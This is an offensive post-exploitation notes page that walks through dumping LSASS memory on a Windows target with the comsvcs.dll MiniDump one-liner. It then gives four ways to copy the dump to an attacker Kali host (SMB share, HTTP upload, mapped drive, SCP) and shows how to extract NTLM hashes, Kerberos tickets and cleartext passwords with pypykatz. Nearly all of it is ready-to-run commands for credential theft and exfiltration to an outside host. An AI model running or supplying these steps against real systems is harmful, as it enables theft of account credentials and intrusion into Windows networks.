# LSASS Dumping & Credential Extraction using pypykatz

Part of the **Offensive-Active-Directory / Post-Exploitation** notes series.

---

## Overview

This guide covers:

- Installing **pypykatz** on Kali Linux
- Dumping **LSASS memory** from a Windows target
- Transferring the dump to an attacker machine
- Extracting credentials from the dump file

GitHub → [https://github.com/skelsec/pypykatz](https://github.com/skelsec/pypykatz)

---

## 1. Installing pypykatz (Kali Linux)

### Recommended Method: Using `pipx`

Install and isolate the tool safely:

```bash
sudo apt update
pipx install pypykatz
```

Ensure binaries are in PATH:

```bash
pipx ensurepath
```

> **Note:** Restart your terminal if `pypykatz` is not recognized.

---

## 2. LSASS Memory Dump (Windows Target)

```powershell
rundll32.exe C:\Windows\System32\comsvcs.dll, MiniDump $LsassPID C:\Windows\Temp\lsass.dmp full
```

### Explanation

- Uses native Windows DLL (`comsvcs.dll`)
- Calls `MiniDump` function
- Generates a full LSASS memory dump

> ⚠️ This action is highly monitored by modern EDR solutions.

---

## 3. Exfiltration of LSASS Dump

Transfer `lsass.dmp` to your Kali machine for offline parsing.

### Method 1: SMB Transfer (Impacket)

**On Kali**

```bash
mkdir ~/loot
cd ~/loot
impacket-smbserver loot $(pwd) -smb2support
```

**On Windows**

```powershell
copy C:\Windows\Temp\lsass.dmp \\<KALI_IP>\loot\lsass.dmp
```

**Alternate location (Task Manager dump):**

```powershell
copy "C:\Users\Administrator\AppData\Local\Temp\lsass.DMP" \\<KALI_IP>\loot\lsass.dmp
```

Optional authenticated mount (if the SMB share requires credentials):

```powershell
net use \\192.168.10.7\loot /user:user pass
copy C:\Windows\Temp\lsass.dmp \\192.168.10.7\loot\lsass.dmp
```

### Method 2: Python Upload Server

**On Kali**

```bash
pip install uploadserver
python3 -m uploadserver
```

**On Windows**

```powershell
$file = "C:\Windows\Temp\lsass.dmp"
$url = "http://<KALI_IP>:8000/upload"

Invoke-RestMethod -Uri $url -Method Post -InFile $file -ContentType "multipart/form-data"
```

### Method 3: SMB Drive Mapping

**On Windows**

```powershell
net use Z: \\<KALI_IP>\loot
copy C:\Windows\Temp\lsass.dmp Z:\lsass.dmp
net use Z: /delete
```

### Method 4: SCP Transfer (if SSH available)

```bash
scp C:\Windows\Temp\lsass.dmp kali@<KALI_IP>:/home/kali/lsass.dmp
```

---

## 4. Credential Extraction with pypykatz

### Parse LSASS Dump

```bash
pypykatz lsa minidump /home/kali/lsass.dmp
```

### Expected Output May Include

- NTLM hashes
- Kerberos tickets
- Cleartext passwords (if present)
- DPAPI secrets

---

## Key Concepts

### LSASS (Local Security Authority Subsystem Service)

Responsible for handling authentication and security policies.

**Contains sensitive data such as:**

- NTLM password hashes
- Kerberos tickets (TGT/TGS)
- Cached credentials
- Plaintext passwords (rare, but possible)

### comsvcs.dll Dump Technique

- Native Windows method
- Uses `MiniDump` API
- Often bypasses basic AV, but **not EDR**
